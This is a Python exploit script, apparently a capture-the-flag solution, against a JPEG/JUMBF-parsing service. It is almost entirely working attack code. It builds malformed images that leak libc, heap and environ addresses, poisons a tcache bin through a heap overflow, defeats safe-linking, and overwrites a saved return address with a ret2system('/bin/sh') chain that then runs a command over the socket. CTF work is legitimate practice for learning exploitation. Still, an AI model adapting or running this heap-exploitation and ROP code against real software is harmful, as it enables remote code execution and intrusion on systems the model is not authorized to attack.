#!/usr/bin/env python3
"""
dbench_jumbf final exploit/helper

Tested locally against the bundled server.  Remote usage:

  python3 dbench_jumbf_solve.py challs.nusgreyhats.org 32167 --mode exploit

The exploit leaks libc + heap + environ, poisons the 0x70 tcache bin, then makes
an APP11/JUMBF allocation return over db_extract_jumbfs_from_jpg1()'s active
saved RBP/RIP slot.  The copied JUMBF header becomes dummy RBP and the payload
becomes a ret2system('/bin/sh') chain.  Once the shell is live it sends the
command from --cmd (default: cat /flag.txt; echo DONE).
"""
from __future__ import annotations

import argparse
import os
import socket
import struct
import subprocess
import sys
import time
from dataclasses import dataclass
from typing import Optional

# Offsets for the libc used by the provided Debian trixie image.
LIBC_MAIN_ARENA_LEAK_OFF = 0x1e5b20
LIBC_SYSTEM              = 0x53110
LIBC_BINSH               = 0x1a5ea4
LIBC_ENVIRON             = 0x1ece28
LIBC_RET                 = 0x2a146
LIBC_POP_RDI             = 0x2a145

# The active return slot of db_extract_jumbfs_from_jpg1() is stable at:
#   target = environ - 0x388
# target points at saved RBP; target+8 is saved RIP.
DEFAULT_STACK_DELTA = 0x388

JSON_UUID = bytes.fromhex('6a736f6e00110010800000aa00389b71')


def p16(x: int) -> bytes: return struct.pack('>H', x & 0xffff)
def p32(x: int) -> bytes: return struct.pack('>I', x & 0xffffffff)
def p64be(x: int) -> bytes: return struct.pack('>Q', x & 0xffffffffffffffff)
def q(x: int) -> bytes: return struct.pack('<Q', x & 0xffffffffffffffff)
def u64(x: bytes) -> int: return struct.unpack('<Q', x.ljust(8, b'\0'))[0]


def box(tbox: bytes, payload: bytes) -> bytes:
    assert len(tbox) == 4
    return p32(8 + len(payload)) + tbox + payload


def wrap_jpeg(jumb: bytes, pad_to: Optional[int] = None) -> bytes:
    assert len(jumb) + 10 <= 0xffff
    app11 = (
        b'\xff\xeb' + p16(10 + len(jumb)) +
        p16(0x4a50) + p16(1) + p32(1) + jumb
    )
    img = b'\xff\xd8' + app11 + b'\xff\xda\x00\x02\xff\xd9'
    if pad_to is not None and len(img) < pad_to:
        img += b'P' * (pad_to - len(img))
    return img


def app11_raw(jumb: bytes, en: int, extra_copy: bytes = b'') -> bytes:
    body = jumb + extra_copy
    return b'\xff\xeb' + p16(10 + len(body)) + p16(0x4a50) + p16(en) + p32(1) + body


def multi_jpeg(parts: list[tuple[int, bytes, bytes]], pad_to: Optional[int] = None) -> bytes:
    img = b'\xff\xd8' + b''.join(app11_raw(j, en, extra) for en, j, extra in parts) + b'\xff\xda\x00\x02\xff\xd9'
    if pad_to is not None and len(img) < pad_to:
        img += b'P' * (pad_to - len(img))
    return img


def one_jpeg(jumb: bytes, extra: bytes = b'', pad_to: Optional[int] = None) -> bytes:
    return multi_jpeg([(1, jumb, extra)], pad_to)


def jumb_with_content(total: int, typ: bytes = b'abcd', fill: bytes = b'B') -> bytes:
    desc = box(b'jumd', JSON_UUID + b'\x01')
    rem = total - 8 - len(desc)
    if rem < 0 or (0 < rem < 8):
        raise ValueError('bad total')
    content = b'' if rem == 0 else p32(rem) + typ + fill * (rem - 8)
    j = p32(total) + b'jumb' + desc + content
    assert len(j) == total
    return j


def desc_only_jumb(total: int, toggles: int = 1, extra: bytes = b'') -> bytes:
    desc_size = total - 8
    payload = JSON_UUID + bytes([toggles]) + extra
    if len(payload) > desc_size - 8:
        raise ValueError('too much desc payload')
    payload += b'D' * (desc_size - 8 - len(payload))
    desc = p32(desc_size) + b'jumd' + payload
    j = p32(total) + b'jumb' + desc
    assert len(j) == total
    return j


def one_content_jumb(total: int = 0x321) -> bytes:
    desc = box(b'jumd', JSON_UUID + b'\x01')
    rem = total - 8 - len(desc)
    content = p32(rem) + b'abcd' + b'C' * (rem - 8)
    j = p32(total) + b'jumb' + desc + content
    assert len(j) == total
    return j


def crash_image() -> bytes:
    payload = b'A' * 0x200
    return (
        b'\xff\xd8' +
        b'\xff\xeb' + p16(10 + 8 + len(payload)) + p16(0x4a50) + p16(1) + p32(1) +
        p32(0x20) + b'jumb' + payload +
        b'\xff\xda\x00\x02\xff\xd9'
    )


def wrap_heap_leak_jumb(R: int = 0x300, off2: Optional[int] = None, delta: int = 0x80) -> bytes:
    if off2 is None:
        off2 = R - 16
    desc = box(b'jumd', JSON_UUID + b'\x01')
    content = bytearray(b'A' * R)
    content[0:8] = p32(off2) + b'abcd'
    content[off2:off2 + 16] = p32(1) + b'json' + p64be((1 << 64) - delta)
    box3 = off2 - delta
    s3 = R - off2 + delta
    content[box3:box3 + 8] = p32(s3) + b'abcd'
    jp = desc + bytes(content)
    return p32(8 + len(jp)) + b'jumb' + jp


def guard_jumb(total: int = 0x5000, free_size: int = 0x4f10) -> bytes:
    desc = box(b'jumd', JSON_UUID + b'\x01')
    rest = total - 8 - len(desc) - free_size
    if rest < 8:
        raise ValueError('bad guard')
    content = p32(free_size) + b'free' + b'F' * (free_size - 8) + p32(rest) + b'abcd' + b'C' * (rest - 8)
    j = p32(total) + b'jumb' + desc + content
    assert len(j) == total
    return j


def arena_leak_jumb(R: int = 0x200, target_off: int = 0x140) -> bytes:
    desc = box(b'jumd', JSON_UUID + b'\x01')
    content = bytearray(b'A' * R)
    content[0:8] = p32(R + target_off) + b'abcd'
    jp = desc + bytes(content)
    return p32(8 + len(jp)) + b'jumb' + jp


def prep_tcache_img() -> bytes:
    # Two 0x58 JUMBF chunks (same 0x70 tcache bin as DbBox) followed by a 0x321 chunk B.
    # Do not pad this JPEG: padding changes the chunk layout used by the overflow offset.
    return multi_jpeg([
        (1, desc_only_jumb(0x58), b''),
        (2, desc_only_jumb(0x58), b''),
        (3, desc_only_jumb(0x321), b''),
    ])


def poison_pop_img(B: int, target: int, target_chunk_off: int = 0xb70) -> bytes:
    # Overflow from a reused 0x321 JUMBF buffer into the freed 0x58 tcache head.
    # The content-box parse allocates one DbBox(0x58), popping the real head and leaving
    # tcache head = target. Safe-linking uses little-endian fd = target ^ (P >> 12).
    P = B + target_chunk_off
    enc = target ^ (P >> 12)
    base = one_content_jumb(0x321)
    need = target_chunk_off - len(base)
    if need < 0:
        raise ValueError('bad target_chunk_off')
    return one_jpeg(base, b'A' * need + q(enc), pad_to=0x1200)


def arb_jumb(B: int, target: int, total: int = 0x321) -> bytes:
    desc = box(b'jumd', JSON_UUID + b'\x01')
    start = B + 8 + len(desc)
    size1 = (target - start) & ((1 << 64) - 1)
    content = p32(1) + b'abcd' + p64be(size1)
    content += b'R' * (total - 8 - len(desc) - len(content))
    j = p32(total) + b'jumb' + desc + content
    assert len(j) == total
    return j


def rop_over_extract_jumb(libc: int, total: int = 0x58) -> bytes:
    # Copied directly over [saved_rbp, saved_rip, ...] of db_extract_jumbfs_from_jpg1().
    # The mandatory JUMBF header at offset 0 becomes a harmless dummy saved RBP.
    chain = [
        libc + LIBC_RET,       # align stack for system
        libc + LIBC_POP_RDI,
        libc + LIBC_BINSH,
        libc + LIBC_SYSTEM,
    ]
    j = p32(total) + b'jumb' + b''.join(q(x) for x in chain)
    j += b'J' * (total - len(j))
    assert len(j) == total
    return j


@dataclass
class Tube:
    proc: Optional[subprocess.Popen] = None
    sock: Optional[socket.socket] = None
    buf: bytes = b''

    def recv_some(self, n: int = 4096) -> bytes:
        if self.sock is not None:
            return self.sock.recv(n)
        assert self.proc is not None and self.proc.stdout is not None
        return os.read(self.proc.stdout.fileno(), n)

    def send(self, data: bytes) -> None:
        if self.sock is not None:
            self.sock.sendall(data)
        else:
            assert self.proc is not None and self.proc.stdin is not None
            self.proc.stdin.write(data)
            self.proc.stdin.flush()

    def recv_until(self, marker: bytes, timeout: float = 8.0) -> bytes:
        if self.sock is not None:
            self.sock.settimeout(timeout)
        end = time.time() + timeout
        while marker not in self.buf and time.time() < end:
            try:
                chunk = self.recv_some(4096)
            except (TimeoutError, socket.timeout):
                chunk = b''
            if not chunk:
                break
            self.buf += chunk
        idx = self.buf.find(marker)
        if idx >= 0:
            out = self.buf[:idx + len(marker)]
            self.buf = self.buf[idx + len(marker):]
            return out
        out, self.buf = self.buf, b''
        return out

    def close(self) -> None:
        try:
            if self.sock is not None:
                self.sock.close()
            if self.proc is not None:
                self.proc.kill()
        except Exception:
            pass


def connect(args: argparse.Namespace) -> Tube:
    if args.local:
        p = subprocess.Popen([args.local], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=os.environ.copy())
        return Tube(proc=p)
    s = socket.create_connection((args.host, args.port), timeout=8)
    s.settimeout(8)
    return Tube(sock=s)


def send_image(t: Tube, img: bytes, wait_done: bool = True) -> bytes:
    out = t.recv_until(b'jpeg size> ')
    t.send(str(len(img)).encode() + b'\n')
    out += t.recv_until(b'jpeg hex> ')
    # Critical: no trailing newline. The service reads exactly jpeg_size bytes of hex.
    t.send(img.hex().encode())
    if wait_done:
        out += t.recv_until(b'done\n')
    return out


def finish(t: Tube) -> bytes:
    out = t.recv_until(b'jpeg size> ')
    t.send(b'0\n')
    out += t.recv_until(b'goodbye\n')
    return out


def extract_data_blocks(out: bytes) -> list[bytes]:
    blocks, pos = [], 0
    marker = b'Data         : '
    while True:
        i = out.find(marker, pos)
        if i < 0:
            break
        start = i + len(marker)
        blocks.append(out[start:start + 256])
        pos = start
    return blocks


def find_ptrs(block: bytes) -> list[int]:
    vals = []
    for align in range(8):
        for i in range(align, max(align, len(block) - 7), 8):
            v = u64(block[i:i + 8])
            if 0x550000000000 <= v < 0x570000000000 or 0x700000000000 <= v < 0x800000000000:
                vals.append(v)
    return vals


def parse_last_interesting_qword(out: bytes) -> tuple[int, bytes]:
    for b in extract_data_blocks(out)[::-1]:
        if len(b) >= 8 and b[:8] not in (b'R' * 8, b'C' * 8):
            return u64(b[:8]), b
    raise RuntimeError('no useful qword in Data blocks')


def leak_libc(t: Tube) -> tuple[int, int]:
    out = b''
    for size, count in [(0x68, 7), (0x58, 7)]:
        for _ in range(count):
            out += send_image(t, wrap_jpeg(jumb_with_content(size)))
    out += send_image(t, wrap_jpeg(guard_jumb()))
    out += send_image(t, wrap_jpeg(arena_leak_jumb(target_off=0x140), pad_to=0x8000))
    ptrs: list[int] = []
    for b in extract_data_blocks(out):
        ptrs.extend(v for v in find_ptrs(b) if 0x700000000000 <= v < 0x800000000000)
    if not ptrs:
        raise RuntimeError('libc leak failed')
    leak = ptrs[-1]
    return leak - LIBC_MAIN_ARENA_LEAK_OFF, leak


def leak_heap_B(t: Tube) -> tuple[int, list[int]]:
    out = send_image(t, wrap_jpeg(wrap_heap_leak_jumb()))
    ptrs: list[int] = []
    for b in extract_data_blocks(out):
        ptrs.extend(v for v in find_ptrs(b) if 0x550000000000 <= v < 0x570000000000)
    if not ptrs:
        raise RuntimeError('heap leak failed')
    # For this heap shape, first leaked heap pointer is B+0x348.
    return ptrs[0] - 0x348, ptrs


def leak_environ(t: Tube, B: int, libc: int) -> int:
    out = send_image(t, one_jpeg(arb_jumb(B, libc + LIBC_ENVIRON - 8)))
    envp, _ = parse_last_interesting_qword(out)
    if not (0x700000000000 <= envp < 0x800000000000):
        raise RuntimeError(f'bad environ leak: {envp:#x}')
    return envp


def do_crash(args: argparse.Namespace) -> int:
    t = connect(args)
    try:
        sys.stdout.buffer.write(send_image(t, crash_image()))
    finally:
        t.close()
    return 0


def do_heap_leak(args: argparse.Namespace) -> int:
    t = connect(args)
    try:
        B, ptrs = leak_heap_B(t)
        print(f'[+] B = {B:#x}')
        print('[+] heap ptrs:', ', '.join(hex(x) for x in ptrs[:8]))
        sys.stdout.buffer.write(finish(t))
    finally:
        t.close()
    return 0


def do_libc_leak(args: argparse.Namespace) -> int:
    t = connect(args)
    try:
        libc, leak = leak_libc(t)
        print(f'[+] leak = {leak:#x}')
        print(f'[+] libc = {libc:#x}')
        sys.stdout.buffer.write(finish(t))
    finally:
        t.close()
    return 0


def do_exploit(args: argparse.Namespace) -> int:
    t = connect(args)
    try:
        libc, arena = leak_libc(t)
        print(f'[+] libc leak = {arena:#x}', flush=True)
        print(f'[+] libc base = {libc:#x}', flush=True)

        B, hptrs = leak_heap_B(t)
        print(f'[+] JUMBF heap B = {B:#x}', flush=True)
        print('[+] heap ptrs =', ', '.join(hex(x) for x in hptrs[:3]), flush=True)

        envp = leak_environ(t, B, libc)
        print(f'[+] environ = {envp:#x}', flush=True)

        target = envp - args.stack_delta
        if target & 0xf:
            print(f'[!] target {target:#x} is not 16-byte aligned; continuing anyway', flush=True)
        print(f'[+] overwrite db_extract saved frame at {target:#x} (RIP {target + 8:#x})', flush=True)

        send_image(t, prep_tcache_img())
        send_image(t, poison_pop_img(B, target))

        final = one_jpeg(rop_over_extract_jumb(libc))
        send_image(t, final, wait_done=False)

        time.sleep(args.delay)
        cmd = args.cmd.encode() + b'\n'
        t.send(cmd)

        data = b''
        end = time.time() + args.read_timeout
        while time.time() < end:
            try:
                c = t.recv_some(4096)
            except (socket.timeout, TimeoutError):
                continue
            except Exception:
                break
            if not c:
                break
            data += c
            if args.marker.encode() in data:
                break
        sys.stdout.buffer.write(data)
        return 0
    finally:
        t.close()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument('host', nargs='?')
    ap.add_argument('port', nargs='?', type=int)
    ap.add_argument('--local', help='path to local ./server instead of remote HOST PORT')
    ap.add_argument('--mode', choices=['exploit', 'crash', 'heap-leak', 'libc-leak'], default='exploit')
    ap.add_argument('--cmd', default='cat /flag.txt; echo DONE', help='command to run after /bin/sh spawns')
    ap.add_argument('--marker', default='DONE', help='stop reading output after this marker')
    ap.add_argument('--delay', type=float, default=0.25)
    ap.add_argument('--read-timeout', type=float, default=6.0)
    ap.add_argument('--stack-delta', type=lambda x: int(x, 0), default=DEFAULT_STACK_DELTA,
                    help='environ - delta = active db_extract saved RBP slot')
    args = ap.parse_args()
    if not args.local and (not args.host or not args.port):
        ap.error('provide HOST PORT or --local ./server')

    if args.mode == 'crash':
        return do_crash(args)
    if args.mode == 'heap-leak':
        return do_heap_leak(args)
    if args.mode == 'libc-leak':
        return do_libc_leak(args)
    return do_exploit(args)


if __name__ == '__main__':
    raise SystemExit(main())
